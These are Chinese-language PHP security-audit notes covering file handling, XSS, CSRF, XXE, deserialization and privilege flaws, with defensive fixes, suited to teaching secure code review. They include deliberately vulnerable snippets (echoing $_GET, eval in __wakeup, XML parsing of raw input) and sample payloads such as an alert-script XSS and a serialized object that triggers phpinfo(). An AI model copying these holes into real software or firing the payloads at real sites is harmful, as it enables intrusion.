<li>临时文件路径必须是php上传表单自动处理产生的 例如 $_FILES["pictures"]["tmp_name"]</li>
<li>"pictures" 为表单中的 name ; "tmp_name" 为固定变量名(临时文件名)</li>
</ul>

<p>
<b>注:只要PHP收到POST上传文件表单 哪怕php页面一行代码没有 都会将上传文件保存到临时目录 在请求结束后如果临时文件没有被移⾛就会被自动删除 从写入文件到删除文件有个短暂的窗口时间 可用于文件包含</b>
</p>

<p>
文件解压
</p>
<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">zip</span> = new \ZipArchive;
$<span style="color: #a0522d;">zip</span>-&gt;open(<span style="color: #8b2252;">'test_new.zip'</span>, \ZipArchive::CREATE) //&#25171;&#24320;&#19968;&#20010;zip&#25991;&#20214;
$<span style="color: #a0522d;">zip</span>-&gt;addFile(<span style="color: #8b2252;">'test.txt'</span>); //&#28155;&#21152;&#21387;&#32553;&#25991;&#20214;
$<span style="color: #a0522d;">zip</span>-&gt;addEmptyDir(<span style="color: #8b2252;">'newdir'</span>);//&#28155;&#21152;&#31354;&#30446;&#24405;
$<span style="color: #a0522d;">zip</span>-&gt;addFromString(<span style="color: #8b2252;">'new.txt'</span>, <span style="color: #8b2252;">'&#25991;&#26412;'</span>);//&#20174;&#23383;&#31526;&#20018;&#28155;&#21152;&#25991;&#20214;&#21040;&#21387;&#32553;&#21253;
$<span style="color: #a0522d;">zip</span>-&gt;extractTo(<span style="color: #8b2252;">'upload'</span>);//&#23558;&#21387;&#32553;&#21253;&#25991;&#20214;&#35299;&#21387;&#21040;upload&#30446;&#24405;&#19979;
$<span style="color: #a0522d;">zip</span>-&gt;close();//&#20851;&#38381;zip

&#27880;:ZipArchive&#25193;&#23637;&#22312;windows&#24179;&#21488; php&#29256;&#26412;&gt;5.6&#26102;&#40664;&#35748;&#23433;&#35013;. linux&#21450;windows&#20854;&#20182;&#29256;&#26412;&#38656;&#35201;&#25163;&#21160;&#32534;&#35793;&#23433;&#35013;.
</pre>
</div>

<p>
<b>审计时重点查找 extractTo方法</b>
</p>

<p>
判断解压目录是否在web目录下 是否检查压缩包内文件类型 如果不在web目录下也可以使用 .. 进行目录穿越控制上传目录 到web目录下 或者在权限足够的情况下写入文件到系统关键目录
</p>

<p>
文件写入/上传
函数 描述 例子
</p>
<div class="org-src-container">
<pre class="src src-sh">file_put_contents &#23558;&#19968;&#20010;&#23383;&#31526;&#20018;&#20889;&#20837;&#25991;&#20214;
<span style="color: #0000ff;">file_put_contents</span>(<span style="color: #8b2252;">"1.txt"</span>,<span style="color: #8b2252;">"666 6"</span>);

move_uploaded_file &#23558;&#19978;&#20256;&#30340;&#20020;&#26102;&#25991;&#20214;&#31227;&#21160;&#21040;&#26032;&#30340;&#20301;&#32622;
<span style="color: #0000ff;">move_uploaded_file</span>($<span style="color: #a0522d;">_FILES</span>[ <span style="color: #8b2252;">"pictures"</span>][<span style="color: #8b2252;">"tmp_name"</span>],<span style="color: #8b2252;">"1.php"</span>)

rename &#37325;&#21629;&#21517;&#25991;&#20214;/&#30446;&#24405;
<span style="color: #0000ff;">rename</span>($<span style="color: #a0522d;">oldname</span>,$<span style="color: #a0522d;">newname</span>);

rmdir &#21024;&#38500;&#30446;&#24405;
mkdir &#21019;&#24314;&#30446;&#24405;
unlink &#21024;&#38500;&#25991;&#20214;
copy &#22797;&#21046;&#25991;&#20214;
<span style="color: #0000ff;">copy</span>($<span style="color: #a0522d;">file</span>, $<span style="color: #a0522d;">newfile</span>);

fopen/fputs/fwrite &#25171;&#24320;&#25991;&#20214;&#25110;&#32773; URL
https://www.php.net/manual/zh/function.fwrite.php

link &#21019;&#24314;&#25991;&#20214;&#30828;&#38142;&#25509;
<span style="color: #0000ff;">link</span>($<span style="color: #a0522d;">target</span>, $<span style="color: #a0522d;">link</span>);

symlink &#21019;&#24314;&#31526;&#21495;&#38142;&#25509;(&#36719;&#38142;&#25509;)
<span style="color: #0000ff;">symlink</span>($<span style="color: #a0522d;">target</span>, $<span style="color: #a0522d;">link</span>);

tmpfile &#21019;&#24314;&#19968;&#20010;&#20020;&#26102;&#25991;&#20214; (&#22312;&#20020;&#26102;&#30446;&#24405;&#23384;&#25918; &#38543;&#26426;&#25991;&#20214;&#21517; &#36820;&#22238;&#21477;&#26564;)
$<span style="color: #a0522d;">temp</span> = tmpfile(); fwrite($<span style="color: #a0522d;">temp</span>, <span style="color: #8b2252;">"123456"</span>);
<span style="color: #0000ff;">fclose</span>($<span style="color: #a0522d;">temp</span>);

<span style="color: #0000ff;">request</span>()-&gt;file()-&gt;move()request()-&gt;file()-&gt;file() Thinkphp &#25991;&#20214;&#19978;&#20256;https://www.kancloud.cn/manual/thinkphp5/155159
$<span style="color: #a0522d;">file</span> = request()-&gt;file($<span style="color: #a0522d;">name</span>);$<span style="color: #a0522d;">file</span>-&gt;move($<span style="color: #a0522d;">filepath</span>);

extractTo &#35299;&#21387;zip &#21040;&#30446;&#24405;
</pre>
</div>

<p>
文件读取
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968; &#25551;&#36848; &#20363;&#23376;
file_get_contents &#35835;&#20837;&#25991;&#20214;&#36820;&#22238;&#23383;&#31526;&#20018;
<span style="color: #483d8b;">echo</span> file_get_contents(<span style="color: #8b2252;">"flag.txt"</span>); <span style="color: #483d8b;">echo</span>
<span style="color: #0000ff;">file_get_contents</span>(<span style="color: #8b2252;">"https://www.bilibili.com/"</span>);

readfile &#35835;&#21462;&#19968;&#20010;&#25991;&#20214;&#65292;&#24182;&#20889;&#20837;&#21040;&#36755;&#20986;&#32531;&#20914;&#12290;&#21516;file_get_contents

fopen/fread/fgets/fgetss/fgetc/fgetcsv/fpassthru/fscanf &#25171;&#24320;&#25991;&#20214;&#25110;&#32773; URL &#35835;&#21462;&#25991;&#20214;&#27969;
$<span style="color: #a0522d;">file</span> = fopen(<span style="color: #8b2252;">"test.txt"</span>,<span style="color: #8b2252;">"r"</span>); <span style="color: #483d8b;">echo</span> fread($<span style="color: #a0522d;">file</span>,<span style="color: #8b2252;">"1234"</span>); fclose($<span style="color: #a0522d;">file</span>);

file &#25226;&#25972;&#20010;&#25991;&#20214;&#35835;&#20837;&#19968;&#20010;&#25968;&#32452;&#20013;
<span style="color: #483d8b;">echo</span> implode(<span style="color: #8b2252;">''</span>, file(<span style="color: #8b2252;">'https://www.bilibili.com/ '</span>));

highlight_file/show_source &#35821;&#27861;&#39640;&#20142;&#19968;&#20010;&#25991;&#20214;
<span style="color: #0000ff;">highlight_file</span>(<span style="color: #8b2252;">"1.php"</span>);

parse_ini_file &#35835;&#21462;&#24182;&#35299;&#26512;&#19968;&#20010;ini&#37197;&#32622;&#25991;&#20214;
<span style="color: #0000ff;">print_r</span>(parse_ini_file(<span style="color: #8b2252;">'1.ini'</span>));

simplexml_load_file &#35835;&#21462;&#25991;&#20214;&#20316;&#20026;XML&#25991;&#26723;&#35299;&#26512;
</pre>
</div>

<p>
全部文件操作函数可参考PHP官方手册 <a href="https://www.php.net/manual/zh/ref.filesystem.php">https://www.php.net/manual/zh/ref.filesystem.php</a>
</p>
</div>
</div>
<div id="outline-container-h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d" class="outline-3">
<h3 id="h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d">XSS</h3>
<div class="outline-text-3" id="text-h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d">
<p>
跨站脚本(攻击) 让用户浏览器执行到攻击者指定的JS脚本代码
</p>
</div>
<div id="outline-container-h:d54c2e79-81af-4bc0-9bec-036b0e453224" class="outline-4">
<h4 id="h:d54c2e79-81af-4bc0-9bec-036b0e453224">安全分享</h4>
<div class="outline-text-4" id="text-h:d54c2e79-81af-4bc0-9bec-036b0e453224">
<p>
工作中一般xss漏洞不怎么审，如果审计xss漏洞，由于现在基本都是前后端分离，很多前端做了过滤但后端不知道，所以导致审计误报会很高。一般审后端代码时不看看xss漏洞，审前端时会看。
</p>

<p>
XSS
</p>
</div>
</div>
<div id="outline-container-h:ac3f2834-28fc-48da-9b09-cc527f45e3d3" class="outline-4">
<h4 id="h:ac3f2834-28fc-48da-9b09-cc527f45e3d3">反射型XSS</h4>
<div class="outline-text-4" id="text-h:ac3f2834-28fc-48da-9b09-cc527f45e3d3">
<p>
反射型XSS是服务器后端处理时把处理不当的用户输入输出到网页 导致用户浏览器执行恶意代码
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'Hello '</span>.$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'name'</span>].<span style="color: #8b2252;">'!'</span>;
</pre>
</div>

<p>
在控制器活模板中直接echo
</p>

<p>
正常输入: ?name=xxx 服务器返回 Hello xxx!
</p>

<p>
浏览器渲染纯文本 Hello xxx!
</p>
<div class="org-src-container">
<pre class="src src-sh">&#25915;&#20987;&#32773;&#36755;&#20837;:
?<span style="color: #a0522d;">name</span>=&lt;script <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text/javascript"</span>&gt;alert(<span style="color: #8b2252;">'XSS!'</span>);&lt;/script&gt;

&#26381;&#21153;&#22120;&#36820;&#22238;
Hello &lt;script <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text/javascript"</span>&gt;alert(<span style="color: #8b2252;">'XSS!'</span>);&lt;/script&gt;!

&#27983;&#35272;&#22120;&#28210;&#26579; Hello ! script&#34987;&#20316;&#20026;html&#26631;&#31614;&#35299;&#26512;&#65292;&#25191;&#34892;&#20854;&#20013;&#30340;&#20195;&#30721;&#65292;&#24377;&#20986;&#35686;&#21578;&#26694;XSS!
</pre>
</div>

<p>
此种漏洞比较明显 很容易分析问题的存在审计时注意 PHP常使用 htmlspecialchars 和 htmlentities函数 转义用户的输入作为防护
</p>

<p>
非前后端分离框架审计时，可以关注templet、view等含有视图关键字的目录
</p>

<p>
可以搜索所有php 输出功能的函数
</p>
</div>
</div>
<div id="outline-container-h:47e9e743-84ef-4aa9-99e8-587b9db97965" class="outline-4">
<h4 id="h:47e9e743-84ef-4aa9-99e8-587b9db97965">php输出函数</h4>
<div class="outline-text-4" id="text-h:47e9e743-84ef-4aa9-99e8-587b9db97965">
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968;&#21517; &#21151;&#33021;&#25551;&#36848;
<span style="color: #483d8b;">echo</span>() &#36755;&#20986;&#23383;&#31526;&#20018;
<span style="color: #0000ff;">print</span>() &#36755;&#20986;&#19968;&#20010;&#25110;&#22810;&#20010;&#23383;&#31526;&#20018;
<span style="color: #0000ff;">print_r</span>() &#25171;&#21360;&#20851;&#20110;&#21464;&#37327;&#30340;&#26131;&#20110;&#29702;&#35299;&#30340;&#20449;&#24687;
<span style="color: #483d8b;">printf</span>() &#36755;&#20986;&#26684;&#24335;&#21270;&#23383;&#31526;&#20018;
<span style="color: #0000ff;">sprintf</span>() &#25226;&#26684;&#24335;&#21270;&#30340;&#23383;&#31526;&#20018;&#20889;&#20837;&#19968;&#20010;&#21464;&#37327;&#20013;
<span style="color: #0000ff;">var_dump</span>() &#36755;&#20986;&#21464;&#37327;&#30340;&#20869;&#23481;&#12289;&#31867;&#22411;&#25110;&#23383;&#31526;&#20018;&#30340;&#20869;&#23481;&#12289;&#31867;&#22411;&#12289;&#38271;&#24230;
<span style="color: #0000ff;">die</span>() &#36755;&#20986;&#19968;&#26465;&#28040;&#24687;&#65292;&#24182;&#36864;&#20986;&#24403;&#21069;&#33050;&#26412;
</pre>
</div>

<p>
查看输出函数是否将用户输入直接输出到前端页面当中
</p>
</div>
</div>
<div id="outline-container-h:7cc3a036-d4a1-4d93-a262-234d3c6e6805" class="outline-4">
<h4 id="h:7cc3a036-d4a1-4d93-a262-234d3c6e6805">储存型XSS</h4>
<div class="outline-text-4" id="text-h:7cc3a036-d4a1-4d93-a262-234d3c6e6805">
<p>
将服务器储存的处理不当的用户输入输出到网页 导致用户浏览器执行恶意代码
</p>
<ul class="org-ul">
<li>攻击者输入-&gt;服务器储存 攻击者得到一个返回储存值的页面</li>
<li>被害者请求页面-&gt;服务器调用储存并输出-&gt;XSS 常见于评论 留言 文章 等</li>
</ul>

<p>
比如:
</p>
<ul class="org-ul">
<li>发布评论 攻击者发布带有恶意代码的评论 被害者访问评论展示页面 触发XSS 后台管理员审核评论时 触发XSS</li>
<li>用户系统设置昵称时 攻击者将昵称写入数据库 在评论显示时读取数据库值输出用户昵称</li>
</ul>

<p>
前端外部文件引用
</p>

<p>
攻击者修改前端引用的文件链接 引用外部网站文件常见于 <b>用户头像 文章/评论图片</b> 等
</p>

<p>
被害者访问到攻击者个人页面 <b>文章 评论 聊天内容时会访问远程图片文件</b>
</p>

<ul class="org-ul">
<li>这可能会使攻击者获取到访问者的ip 浏览器 系统等信息</li>
<li>也可以绕过内容审查 在审查通过后动态替换文件内容(hsbc广告等信息)
<ul class="org-ul">
<li>解决方法:正则匹配限制url域名</li>
</ul></li>
</ul>
</div>
<div id="outline-container-h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39" class="outline-5">
<h5 id="h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39">防护</h5>
<div class="outline-text-5" id="text-h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39">
<p>
后端过滤
</p>
<ul class="org-ul">
<li>服务端返回HTTP头 添加内容安全策略 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">content-security-policy</a> 头</li>
<li>正确设置安全策略可以有效减少未知XSS/html外部文件引用漏洞产生的危害</li>
<li>COOKIES添加Httponly属性 防止使用js读取用户cookies (js发起表单仍可携带cookies)</li>
<li>htmlspecialchars()将特殊字符转换为 HTML 实体,注意默认不转义单引号,需设置ENT_QUOTES常量</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:a33faad4-5f9d-4677-972c-6eb69d78c352" class="outline-4">
<h4 id="h:a33faad4-5f9d-4677-972c-6eb69d78c352">PHP设置csp</h4>
<div class="outline-text-4" id="text-h:a33faad4-5f9d-4677-972c-6eb69d78c352">
<p>
可以使用 <code>PHP header()</code> 方法设置
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #0000ff;">header</span>(<span style="color: #8b2252;">"Content-Security-Policy: default-src 'self'"</span>);
?&gt;
</pre>
</div>

<p>
<a href="https://content-security-policy.com/">CSP安全策略参考手册</a>
</p>
</div>
</div>
</div>
<div id="outline-container-h:255edf61-b606-4d2a-b81b-b58fdfba94b9" class="outline-3">
<h3 id="h:255edf61-b606-4d2a-b81b-b58fdfba94b9">CSRF</h3>
<div class="outline-text-3" id="text-h:255edf61-b606-4d2a-b81b-b58fdfba94b9">
<p>
跨站请求伪造
CSRF
</p>
</div>
<div id="outline-container-h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4" class="outline-4">
<h4 id="h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4">安全分享</h4>
<div class="outline-text-4" id="text-h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4">
<p>
如何审计CSRF?
</p>
<ul class="org-ul">
<li>功能是否敏感
<ul class="org-ul">
<li>审计成本高些，需要判断代码逻辑是否是敏感操作</li>
</ul></li>
</ul>

<p>
防御：
</p>
<ul class="org-ul">
<li>请求地址中加token验证</li>
<li>加http refer字段验证</li>
<li>加验证码。短信验证码、图片验证码</li>
</ul>

<p>
解决审计成本高问题，需要接csrf网关，前端自动有token验证。研发人员就不需要做修改，安全人员只需要看有没有接网关。
</p>
</div>
</div>
<div id="outline-container-h:987f99f3-ac90-42e8-81f6-937cee56f96c" class="outline-4">
<h4 id="h:987f99f3-ac90-42e8-81f6-937cee56f96c">表单请求</h4>
<div class="outline-text-4" id="text-h:987f99f3-ac90-42e8-81f6-937cee56f96c">
<p>
攻击者使被害者的浏览器在用户不知情的情况下发起目标网站表单请求 这些表单常常带有目标网站的用户cookies可以以用户在目标网站的身份进行操作 (攻击者不能获取cookies)
</p>

<p>
检查鉴权后的操作是否添加token/Referrer校验 拒绝空Referrer
</p>

<p>
JSONP请求
除了表单常见的还有jsonp请求
服务器返回一段带有函数调用的json 浏览器把jsonp页面当做js加载执行调用回调函数将数据传入函数
用于浏览器从服务器动态获取信息，由于js等静态资源调用浏览器默认放行,造成了风险
可获取用户登陆后才能获取的信息 ，比如登陆用户个人资料、账户余额 等
</p>

<p>
jsonp可以绕过跨域策略限制
jsonp原理： <a href="https://www.bilibili.com/video/BV1jt411j72F/?p=5&amp;spm_id_from=pageDriver&amp;vd_source=70e4e839cabca1314b02190e14da328a">https://www.bilibili.com/video/BV1jt411j72F/?p=5&amp;spm_id_from=pageDriver&amp;vd_source=70e4e839cabca1314b02190e14da328a</a>
</p>
</div>
</div>
<div id="outline-container-h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb" class="outline-4">
<h4 id="h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb">防护方法</h4>
<div class="outline-text-4" id="text-h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb">
<p>
添加随机token 在表单/jsonp请求时附加token(非常有效)
服务端检测 Referrer (一定要拒绝空Referrer html表单可以发起空referrer)(表单/静态资源引用/jsonp 请求)
如果使用正则匹配一定要检查正则是否可以被绕过
服务器返回Access-Control-Allow-Origin 头 (表单/静态资源引用/jsonp请求无效 仅AJAX请求)(一定不要设置成 *)
</p>

<div class="org-src-container">
<pre class="src src-sh">1.&#21551;&#21160;&#20250;&#35805;&#24182;&#29983;&#25104;&#19968;&#20010;&#38543;&#26426;&#20196;&#29260;&#12290;
<span style="color: #0000ff;">session_start</span>();
$<span style="color: #a0522d;">_SESSION</span>[<span style="color: #8b2252;">"token"</span>] = bin2hex(random_bytes(32));

2.&#23558; CSRF &#20196;&#29260;&#23884;&#20837;&#21040; HTML &#34920;&#21333;&#20013;&#12290;
&lt;input <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"hidden"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"token"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"&lt;?=$_SESSION["</span>token<span style="color: #8b2252;">"]?&gt;"</span>/&gt;

3.&#25552;&#20132;&#34920;&#21333;&#21518;&#65292;&#23558;&#25552;&#20132;&#30340;&#20196;&#29260;&#19982;&#20250;&#35805;&#36827;&#34892;&#20132;&#21449;&#26816;&#26597;&#12290;
<span style="color: #a020f0;">if</span> (!isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">"token"</span>]) || !isset($<span style="color: #a0522d;">_SESSION</span>[<span style="color: #8b2252;">"token"</span>])) {
  <span style="color: #a020f0;">exit</span>();
}
<span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">"token"</span>] == $<span style="color: #a0522d;">_SESSION</span>[<span style="color: #8b2252;">"token"</span>]) {
  DO PROCESSING
}
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5" class="outline-3">
<h3 id="h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5">XXE</h3>
<div class="outline-text-3" id="text-h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5">
<p>
XML外部实体(注入) 攻击者利用xml的性质可以获取本地/远程文件内容 (不同于其他语言 PHP 中xml实体可以使用PHP伪协议)
</p>

<p>
XXE
XML外部实体是XML的一个特性 XML可以使用外部实体引用来包含和解析其他文档当然XML还有其他实体 详细内容可以参考<a href="https://www.yiibai.com/dtd/dtd_entities.html">这个DTD教程</a>
</p>

<p>
这里就不详细将利用技巧了
</p>

<p>
审计时如果发现使用了文末列表的函数 就要检查是否禁用了外部实体
</p>

<p>
<code>libxml_disable_entity_loader(true);</code> //禁用外部实体使用到的函数 参数为true时禁用
</p>

<p>
注意: php环境中libxml 版本&gt;=2.9.0时外部实体默认禁用
</p>

<p>
漏洞常见处:
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968; &#25551;&#36848;
DOMDocument:: loadXML &#21152;&#36733;&#35299;&#26512;XML
&lt;?php$<span style="color: #a0522d;">xml</span>=file_get_contents(<span style="color: #8b2252;">'php://input'</span>);
$<span style="color: #a0522d;">dom</span>=new DOMDocument();
$<span style="color: #a0522d;">dom</span>-&gt;loadXML($<span style="color: #a0522d;">xml</span>);
$<span style="color: #a0522d;">xml</span>=simplexml_import_dom($<span style="color: #a0522d;">dom</span>);
$<span style="color: #a0522d;">xxe</span>=$<span style="color: #a0522d;">xml</span>-&gt;xxe; 
<span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">xxe</span>; ?&gt;

simplexml_load_string &#21152;&#36733;&#35299;&#26512;XML&#23383;&#31526;&#20018;
$<span style="color: #a0522d;">xml</span>=simplexml_load_string($<span style="color: #a0522d;">_REQUEST</span>[<span style="color: #8b2252;">'xml'</span>]);
<span style="color: #0000ff;">print_r</span>($<span style="color: #a0522d;">xml</span>);

simplexml_load_file &#35835;&#21462;&#25991;&#20214;&#20316;&#20026;XML&#25991;&#26723;&#35299;&#26512;
<span style="color: #0000ff;">simplexml_load_file</span>(<span style="color: #8b2252;">"1.xml"</span>)
</pre>
</div>

<p>
Xml parser
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">simple</span> = <span style="color: #8b2252;">"simple note"</span>;
$<span style="color: #a0522d;">p</span> = xml_parser_create();
<span style="color: #0000ff;">xml_parse_into_struct</span>($<span style="color: #a0522d;">p</span>, $<span style="color: #a0522d;">simple</span>, $<span style="color: #a0522d;">vals</span>, $<span style="color: #a0522d;">index</span>);
<span style="color: #0000ff;">xml_parser_free</span>($<span style="color: #a0522d;">p</span>);
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"Index array\n"</span>;
<span style="color: #0000ff;">print_r</span>($<span style="color: #a0522d;">index</span>);
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"\nVals array\n"</span>;
<span style="color: #0000ff;">print_r</span>($<span style="color: #a0522d;">vals</span>);
</pre>
</div>

<p>
如果要防止php中的xxe漏洞，可以在simplexml_load_string前加上一句
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">libxml_disable_entity_loader</span>(true);&#31105;&#27490;&#20174;&#22806;&#37096;&#21152;&#36733;XML&#23454;&#20307;
</pre>
</div>

<p>
libxml_disable_entity_loader - 禁用加载外部实体的功能
</p>
</div>
<div id="outline-container-h:187b348d-9109-4e09-8dd0-168798e32ad7" class="outline-4">
<h4 id="h:187b348d-9109-4e09-8dd0-168798e32ad7">描述</h4>
<div class="outline-text-4" id="text-h:187b348d-9109-4e09-8dd0-168798e32ad7">
<div class="org-src-container">
<pre class="src src-sh">bool libxml_disable_entity_loader ([ bool $<span style="color: #a0522d;">disable</span> = true ] )
</pre>
</div>

<p>
禁用/启用加载外部实体的功能。
</p>
</div>
</div>
<div id="outline-container-h:6bcc6e6f-09a0-42b9-ba5e-ed977e906c44" class="outline-4">
<h4 id="h:6bcc6e6f-09a0-42b9-ba5e-ed977e906c44">参数</h4>
<div class="outline-text-4" id="text-h:6bcc6e6f-09a0-42b9-ba5e-ed977e906c44">
<p>
disable
</p>

<p>
禁用（ TRUE ）或启用（ FALSE ）libxml扩展（如<a href="https://www.php.net/manual/en/book.dom.php">DOM</a>，<a href="https://www.php.net/manual/en/book.xmlwriter.php">XMLWriter</a>和<a href="https://www.php.net/manual/en/book.xmlreader.php">XMLReader</a>）来加载外部实体。
</p>
</div>
</div>
</div>
<div id="outline-container-反序列化" class="outline-3">
<h3 id="反序列化">反序列化</h3>
<div class="outline-text-3" id="text-反序列化">
</div>
<div id="outline-container-h:63e191b7-1f6d-46e9-b50a-9bc7256954af" class="outline-4">
<h4 id="h:63e191b7-1f6d-46e9-b50a-9bc7256954af">序列化</h4>
<div class="outline-text-4" id="text-h:63e191b7-1f6d-46e9-b50a-9bc7256954af">
<p>
函数: serialize
</p>

<p>
将PHP中的值转化为一个字符串，有利于存储或传递 PHP 的值 同时不丢失其类型和结构如果被序列化的值是一个对象
</p>
</div>
</div>
<div id="outline-container-h:a167b31f-bb54-4f9d-b72b-5615b14110ff" class="outline-4">
<h4 id="h:a167b31f-bb54-4f9d-b72b-5615b14110ff">反序列化</h4>
<div class="outline-text-4" id="text-h:a167b31f-bb54-4f9d-b72b-5615b14110ff">
<p>
函数:unserialize
</p>

<ul class="org-ul">
<li>__construct() 当一个对象创建时被调用</li>
<li>__destruct() 当一个对象销毁前被调用</li>
<li>__sleep() 在对象被序列化前被调用</li>
<li>__wakeup 将在反序列化之后立即被调用</li>
</ul>

<p>
反序列化在序列化操作后产生的字符串 还原序列化前的值
如果被反序列化的结果包含对象 则会调用对应对象的__wakeup 魔法函数
如果反序列化的字符串被用户可控 攻击者则有可能利用PHP中现有的对象调用对应魔法函数进行攻击(主要看对象定义的魔法函数所拥有的功能)
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
class xxx2
{
  var $<span style="color: #a0522d;">id</span> = <span style="color: #8b2252;">'1'</span>;
  <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">__wakeup</span>()
  {
    <span style="color: #483d8b;">eval</span>($<span style="color: #a0522d;">this</span>-&gt;id);
  }
}

// &#24207;&#21015;&#21270;
$<span style="color: #a0522d;">xxx1</span> = new xxx2();
<span style="color: #0000ff;">print_r</span>(serialize($<span style="color: #a0522d;">xxx1</span>)); // serialize &#24207;&#21015;&#21270;&#20989;&#25968;&#65292;&#25226;&#23545;&#35937;&#36716;&#21270;&#20026;&#23383;&#31526;&#20018;&#12290;&#23383;&#31526;&#20018;&#20869;&#23481; O:4:<span style="color: #8b2252;">"xxx2"</span>:1:{s:2:<span style="color: #8b2252;">"id"</span>;s:1:<span style="color: #8b2252;">"1"</span>;}
// O&#34920;&#31034;&#36825;&#26159;&#20010;&#23545;&#35937;&#65292;4&#34920;&#31034;&#31867;&#21517;&#26377;4&#20010;&#23383;&#31526;&#65292;xxx2&#34920;&#31034;&#31867;&#21517;&#65292;1&#34920;&#31034;&#26377;1&#20010;&#25104;&#21592;&#21464;&#37327;&#65292;&#25104;&#21592;&#21464;&#37327;&#21517;&#20026;id&#26377;2&#20010;&#23383;&#31526;&#65292;s&#34920;&#31034;string&#31867;&#22411;&#65292;&#25104;&#21592;&#30340;&#20540;&#20026;1&#12290;

// &#21453;&#24207;&#21015;&#21270;
// id &#23545;&#24212;&#30340;&#20540;&#25913;&#20026; phpinfo(); &#21453;&#24207;&#21015;&#21270;&#20250;&#35843;&#29992;__wakeup&#20989;&#25968;&#65292;&#20989;&#25968;&#20869;&#23481;&#26159;&#21033;&#29992;eval&#35299;&#26512;&#25191;&#34892;id&#23545;&#24212;&#30340;&#20540;
$<span style="color: #a0522d;">s</span> = <span style="color: #8b2252;">'O:4:"xxx2":1:{s:2:"id";s:10:"phpinfo();";}'</span>;
$<span style="color: #a0522d;">s_unserialize</span> = unserialize($<span style="color: #a0522d;">s</span>);
<span style="color: #0000ff;">print_r</span>($<span style="color: #a0522d;">s_unserialize</span>);
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;/br&gt;"</span>;
</pre>
</div>

<p>
视频参考： <a href="https://www.bilibili.com/video/BV1p4411L7PM/?spm_id_from=333.337.search-card.all.click&amp;vd_source=70e4e839cabca1314b02190e14da328a">https://www.bilibili.com/video/BV1p4411L7PM/?spm_id_from=333.337.search-card.all.click&amp;vd_source=70e4e839cabca1314b02190e14da328a</a>
</p>

<p>
防御：
</p>
<ul class="org-ul">
<li>过滤反序列化内容
<ul class="org-ul">
<li>全局搜索wakeup，查看是否有接受反序列化路由参数</li>
</ul></li>
<li>找调用链，内建函数带wakeup方法的，看能不能触发</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4" class="outline-3">
<h3 id="h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4">其他漏洞</h3>
<div class="outline-text-3" id="text-h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4">
<p>
逻辑漏洞
业务相关漏洞是非常灵活的一类漏洞
多挖一些互联网公司SRC的业务漏洞，在挖掘达到一定数量后，会对业务漏洞会有更深的理解
</p>
</div>
</div>
<div id="outline-container-h:0d20343f-2f69-41f0-ba70-f7b6d5f94938" class="outline-3">
<h3 id="h:0d20343f-2f69-41f0-ba70-f7b6d5f94938">越权漏洞</h3>
<div class="outline-text-3" id="text-h:0d20343f-2f69-41f0-ba70-f7b6d5f94938">
<p>
越权是指用户可以进行超出业务设计上的权限限制的访问/操作平行越权: 访问/操作与当前用户同等权限的其他用户的数据
</p>

<p>
例:
普通用户A可以删除普通用户B投稿的文章，从业务逻辑设计上用户A只能删除自己创建的稿件，但是在后端未做相应的限制
</p>

<p>
垂直越权: 访问/操作与当前用户未拥有权限的数据
</p>

<p>
例:日志审计管理员，设计上可以审计服务器日志，但不能进行其他操作，系统管理员可以进行系统配置、管理账号等操作
</p>

<p>
如果使用日志审计管理员账号可以进行系统管理员的系统配置操作 这就是一个垂直越权越权漏洞非常灵活 具体细节要结合业务功能进行判断是否存在问题
</p>

<p>
<b>未授权访问/无鉴权/鉴权绕过</b>
访问/操作业务前未进行权限检查 或权限检查不严易被绕过
比如上文的越权漏洞
如果用户未进行登陆操作仍然可以访问后台页面获取数据/进行后台操作，这就是未授权访问(未授权访问&gt;垂直越权)
</p>

<p>
有些后台操作为了方便添加后门 采用了弱校验(硬编码token 从head获取的UA和IP地址 弱JWT秘钥等) 这就可能造成鉴权绕过
</p>

<p>
<b>频率限制</b>
</p>

<p>
在一些关键业务点应做频率限制
</p>

<p>
